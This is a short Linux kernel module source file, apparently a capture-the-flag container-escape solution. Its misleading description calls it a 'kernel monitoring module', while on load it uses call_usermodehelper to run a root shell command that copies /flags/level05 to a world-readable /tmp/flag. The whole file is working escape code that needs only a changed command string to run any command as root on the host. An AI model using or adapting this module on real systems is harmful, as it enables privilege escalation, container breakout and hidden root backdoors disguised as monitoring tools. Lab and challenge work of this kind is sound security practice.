#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("escapepod");
MODULE_DESCRIPTION("kernel monitoring module");

static int __init escape_init(void) {
    char *argv[] = {
        "/bin/sh", "-c",
        "cat /flags/level05 > /tmp/flag && chmod 444 /tmp/flag",
        NULL
    };
    char *envp[] = {
        "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    printk(KERN_INFO "escape: loading\n");
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit escape_exit(void) {
    printk(KERN_INFO "escape: unloading\n");
}

module_init(escape_init);
module_exit(escape_exit);
